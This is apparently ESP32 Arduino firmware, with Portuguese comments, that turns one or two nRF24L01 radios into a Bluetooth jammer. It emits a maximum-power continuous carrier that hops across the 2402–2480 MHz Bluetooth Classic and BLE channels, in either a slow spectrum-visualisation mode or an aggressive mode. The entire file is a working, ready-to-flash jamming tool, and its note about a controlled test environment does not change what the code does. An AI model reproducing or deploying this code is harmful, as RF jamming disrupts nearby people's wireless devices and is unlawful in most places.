#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>

#define PIN_CE_VSPI 22
#define PIN_CSN_VSPI 21
#define PIN_SCK_VSPI 18
#define PIN_MISO_VSPI 19
#define PIN_MOSI_VSPI 23

#define PIN_CE_HSPI 16
#define PIN_CSN_HSPI 15
#define PIN_SCK_HSPI 4
#define PIN_MISO_HSPI 2
#define PIN_MOSI_HSPI 17

// 1 = dwell lento (2 ms/canal) para visualizar no heatmap do analisador
// 0 = modo agressivo para teste com fone BT
#define JAMMER_SPECTRUM_TEST 0

// Banda Bluetooth Classic + BLE: 2402–2480 MHz (F0 = 2400 + RF_CH)
#define BT_CH_MIN 2
#define BT_CH_MAX 80
#define BT_CH_MID 41

#if JAMMER_SPECTRUM_TEST
#define PLL_DWELL_US 2000
#else
#define PLL_DWELL_US 130
#endif

SPIClass vspi(VSPI);
SPIClass hspi(HSPI);

RF24 radio(PIN_CE_VSPI, PIN_CSN_VSPI);
RF24 radio2(PIN_CE_HSPI, PIN_CSN_HSPI);

bool has_radio2 = false;

static void configureJammerRadio(RF24 &r)
{
    r.setAutoAck(false);
    r.setRetries(0, 0);
    r.disableCRC();
    r.setDataRate(RF24_2MBPS);
    r.setPALevel(RF24_PA_MAX);
    r.stopListening();
}

static void startCarrierOn(RF24 &r, uint8_t channel)
{
    r.startConstCarrier(RF24_PA_MAX, channel);
}

static void hopCarrier(RF24 &r, uint8_t channel)
{
    r.setChannel(channel);
    delayMicroseconds(PLL_DWELL_US);
}

void setup()
{
    Serial.begin(115200);
    delay(1000);

    Serial.println("\n\n=== JAMMER BLUETOOTH (CW) — TESTE CELULAR + FONE ===");
    Serial.println("Faixa: 2402–2480 MHz | NRF24 ch 2–80");
#if JAMMER_SPECTRUM_TEST
    Serial.printf("Modo: SPECTRUM_TEST | Dwell: %u us/canal (heatmap)\n", PLL_DWELL_US);
#else
    Serial.printf("Modo: NORMAL | Dwell: %u us/canal\n", PLL_DWELL_US);
#endif
    Serial.println("Alvo: BT Classic + BLE (ex.: BT 5.3). Ambiente controlado.\n");

    vspi.begin(PIN_SCK_VSPI, PIN_MISO_VSPI, PIN_MOSI_VSPI, PIN_CSN_VSPI);
    hspi.begin(PIN_SCK_HSPI, PIN_MISO_HSPI, PIN_MOSI_HSPI, PIN_CSN_HSPI);

    radio.begin(&vspi, PIN_CE_VSPI, PIN_CSN_VSPI);
    radio2.begin(&hspi, PIN_CE_HSPI, PIN_CSN_HSPI);
    has_radio2 = radio2.isChipConnected();

    if (!radio.isChipConnected())
    {
        Serial.println("[ERRO] Radio 1 (VSPI) nao detectado. Verifique fiação e 3.3V.");
    }

    configureJammerRadio(radio);
    startCarrierOn(radio, BT_CH_MIN);

    if (has_radio2)
    {
        configureJammerRadio(radio2);
        startCarrierOn(radio2, BT_CH_MAX);
        Serial.println("[OK] 2 radios: faixa dividida (2–41 e 41–80 MHz)");
    }
    else
    {
        Serial.println("[OK] 1 radio: varredura completa 2–80");
    }

    Serial.println("[JAMMER] Emissao CW ativa. '.' = heartbeat a cada 1 s\n");
}

void loop()
{
    static uint8_t ch_fwd = BT_CH_MIN;
    static uint8_t ch_rev = BT_CH_MAX;
    static unsigned long last_print = 0;

    if (has_radio2)
    {
        // Radio 1: metade inferior | Radio 2: metade superior (cobertura paralela)
        hopCarrier(radio, ch_fwd);
        hopCarrier(radio2, ch_rev);

        ch_fwd++;
        if (ch_fwd > BT_CH_MID)
            ch_fwd = BT_CH_MIN;

        if (ch_rev <= BT_CH_MID)
            ch_rev = BT_CH_MAX;
        else
            ch_rev--;
    }
    else
    {
        hopCarrier(radio, ch_fwd);

        ch_fwd++;
        if (ch_fwd > BT_CH_MAX)
            ch_fwd = BT_CH_MIN;
    }

    if (millis() - last_print >= 1000)
    {
        last_print = millis();
        Serial.print('.');
    }
}
